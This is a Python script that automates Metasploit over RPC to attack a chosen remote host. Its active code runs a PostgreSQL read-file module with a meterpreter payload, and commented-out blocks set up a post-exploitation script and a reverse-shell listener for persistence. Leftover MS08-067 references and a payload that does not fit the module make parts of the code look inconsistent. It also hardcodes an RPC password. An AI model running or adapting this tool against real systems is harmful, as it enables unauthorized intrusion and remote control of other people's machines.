#!/usr/bin/env python3
import os
import sys
import argparse
from time import sleep
from pymetasploit3.msfrpc import MsfRpcClient

# Function to create the MSF .rc files
def builder(RHOST, LHOST, LPORT):
    # No need for this in the current exploit
    with open('/tmp/smbpost.rc', 'w') as post:
        with open('/tmp/ms08067_install.bat', 'w') as bat:
            postcomms = ""
            batcomm = "ms08067_patch.exe /quiet"
            # If needed, write these to the files
            # post.write(postcomms)
            # bat.write(batcomm)

# Sets up the chain of rc files to exploit MS08-067, setup persistence, and patch
def sploiter(RHOST, LHOST, LPORT, session):
    # Connect to Metasploit RPC using pymetasploit3
    #client = MsfRpcClient('abc123',  ssl=True)  # Replace 'abc123' with your actual RPC password
    client = MsfRpcClient('abc123', server='127.0.0.1', port=55552) # Replace with actual password if needed

    # Create a console
    console = client.consoles.console()

    # Exploit PostgreSQL Read File vulnerability
    commands = f"""use auxiliary/admin/postgres/postgres_readfile
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST {RHOST}
set LHOST {LHOST}
set RPORT 5432
set ExitOnSession false
exploit -z
"""
    print(f"[+] Exploiting PostgreSQL Read File on: {RHOST}")
    console.write(commands)

    # Wait for the exploitation process to finish
    while True:
        res = console.read()
        if res['busy']:
            sleep(1)
            continue
        print(res['data'])  # Print the console output
        break

    # Optional: Run post-exploit script (commented out in original)
    # runPost = f"""use post/multi/gather/run_console_rc_file
    # set RESOURCE /tmp/smbpost.rc
    # set SESSION {session}
    # exploit
    # """
    # print(f"[+] Running post-exploit script on: {RHOST}")
    # console.write(runPost)
    # while True:
    #     rres = console.read()
    #     if rres['busy']:
    #         sleep(1)
    #         continue
    #     print(rres['data'])
    #     break

    # Optional: Setup Listener for persistent connection (commented out in original)
    # sleep(10)
    # listen = f"""use exploit/multi/handler
    # set PAYLOAD windows/meterpreter/reverse_tcp
    # set LPORT 80
    # set LHOST {LHOST}
    # exploit
    # """
    # print(f"[+] Setting up listener on: {LHOST}:80")
    # console.write(listen)
    # while True:
    #     lres = console.read()
    #     if lres['busy']:
    #         sleep(1)
    #         continue
    #     print(lres['data'])
    #     break

def main():
    parser = argparse.ArgumentParser(description='MSF Automation Script')
    parser.add_argument('-p', dest='LPORT', type=str, help='Specify a port to listen on')
    parser.add_argument('-r', dest='RHOST', type=str, help='Specify a remote host')
    parser.add_argument('-l', dest='LHOST', type=str, help='Specify a local host')
    parser.add_argument('-s', dest='session', type=str, help='Specify session ID')

    args = parser.parse_args()
    session = args.session
    RHOST = args.RHOST
    LHOST = args.LHOST
    LPORT = args.LPORT

    if RHOST is None or LPORT is None or LHOST is None:
        print(parser.print_usage())
        sys.exit(0)

    builder(RHOST, LHOST, LPORT)
    sploiter(RHOST, LHOST, LPORT, session)

if __name__ == "__main__":
    main()
